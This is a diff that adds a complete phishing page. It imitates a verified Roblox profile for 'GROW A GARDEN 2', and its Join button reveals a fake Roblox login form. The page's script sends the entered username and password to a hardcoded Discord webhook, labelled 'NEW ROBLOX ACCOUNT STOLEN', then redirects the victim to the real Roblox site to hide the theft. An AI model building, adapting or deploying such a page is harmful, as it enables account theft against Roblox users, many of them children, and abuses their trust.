@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body { 
+            margin:0; 
+            padding:0; 
+            background:#ffffff; 
+            color:#000; 
+            font-family:'Roboto',sans-serif; 
+        }
+        .profile { 
+            max-width: 800px; 
+            margin: 40px auto; 
+            background: #f0f0f0; 
+            padding: 40px; 
+            border-radius: 12px; 
+            text-align:center; 
+            position:relative; 
+            min-height: 520px; 
+            border: 2px solid #00bfff;
+        }
+        .avatar { 
+            width: 160px; 
+            height: 160px; 
+            border-radius: 50%; 
+            border: 6px solid #00bfff; 
+            margin: 20px auto; 
+            object-fit: cover;
+        }
+        .username { font-size: 36px; font-weight: bold; color:#000; }
+        .stats { 
+            display: flex; 
+            justify-content: center; 
+            gap: 60px; 
+            margin: 20px 0; 
+            background: #e0e0e0; 
+            padding: 20px; 
+            border-radius: 8px; 
+            color:#000;
+        }
+        .playing {
+            font-size: 18px;
+            color: #000000;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .scene-image { 
+            width: 220px; 
+            height: auto; 
+            border-radius: 12px; 
+            margin: 15px auto;
+            display: block;
+        }
+        .join-btn, .add-friend-btn {
+            position: absolute;
+            bottom: 60px;
+            padding: 12px 32px;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.4s;
+        }
+        .add-friend-btn {
+            right: 195px;
+            background: #00bfff;
+        }
+        .join-btn {
+            right: 20px; /* MOVED FURTHER RIGHT */
+            background: #00ff00;
+        }
+        .add-friend-btn:hover, .join-btn:hover {
+            transform: scale(1.25);
+            box-shadow: 0 0 50px currentColor;
+        }
+        .login-box { 
+            display:none; 
+            width: 420px; 
+            margin: 60px auto; 
+            background: #ffffff; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 0 60px rgba(0,176,255,0.4); 
+            color:#000;
+            border: 1px solid #ddd;
+            position: relative;
+        }
+        .login-logo-small {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 55px;
+        }
+        .login-box h1 {
+            text-align: center;
+            color: #000;
+            font-size: 26px;
+            margin-bottom: 25px;
+        }
+        input { 
+            width:100%; 
+            padding:16px; 
+            margin:12px 0; 
+            background:#f5f5f5; 
+            border:2px solid #ccc; 
+            border-radius:6px; 
+            color:#000; 
+            font-size:17px; 
+        }
+        .btn { 
+            width:100%; 
+            padding:16px; 
+            background:#00bfff; 
+            color:#000; 
+            border:none; 
+            border-radius:6px; 
+            font-size:19px; 
+            cursor:pointer; 
+            font-weight:bold; 
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="profile">
+        <img src="https://files.catbox.moe/73l2n7.jpeg" class="avatar" alt="Avatar">
+        
+        <div class="username">Roblox <span style="color:#00bfff;">✔</span></div>
+        <p>@Roblox</p>
+        
+        <div class="stats">
+            <div><b>0</b><br>Friends</div>
+            <div><b>16.9M</b><br>Followers</div>
+            <div><b>0</b><br>Following</div>
+        </div>
+        
+        <div class="playing">GROW A GARDEN 2</div>
+        
+        <img src="https://files.catbox.moe/u8l4fb.png" class="scene-image" alt="Steal at Night">
+        
+        <button class="add-friend-btn" id="addBtn" onclick="addFriend()">Add Friend</button>
+        <button class="join-btn" onclick="showLogin()">Join</button>
+    </div>
+
+    <div class="login-box" id="loginBox">
+        <img src="https://files.catbox.moe/fw4si8.webp" class="login-logo-small">
+        <img src="https://www.roblox.com/assets/img/logo.svg" style="display:block;margin:0 auto 15px;width:120px;">
+        <h1>Log in to Roblox</h1>
+        <form id="phishForm">
+            <input type="text" id="username" placeholder="Username / Email / Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        function showLogin() {
+            document.querySelector('.profile').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        }
+
+        function addFriend() {
+            const btn = document.getElementById('addBtn');
+            btn.textContent = "Friend Request Sent";
+            btn.style.background = "#00cc00";
+            btn.disabled = true;
+            alert("✅ Friend Request Sent to @Roblox!");
+        }
+
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            const webhook = "https://discord.com/api/webhooks/1517479600312025173/aJF0PdAxpFI1UI-qkhnspWy1xDPzhCLeW1IrgiQVkDpP3S1CMdJMCR-twanJQYfCjKBW";
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "**🔥 NEW ROBLOX ACCOUNT STOLEN 🔥**",
+                    embeds: [{
+                        title: "Roblox Login Hit",
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "Username/Email", value: "```" + user + "```" },
+                            { name: "Password", value: "```" + pass + "```" },
+                            { name: "Time", value: "```" + new Date().toLocaleString() + "```" }
+                        ]
+                    }]
+                })
+            });
+
+            alert("Joining GROW A GARDEN 2...");
+            window.location.href = "https://www.roblox.com/home";
+        });
+    </script>
+</body>
+</html>
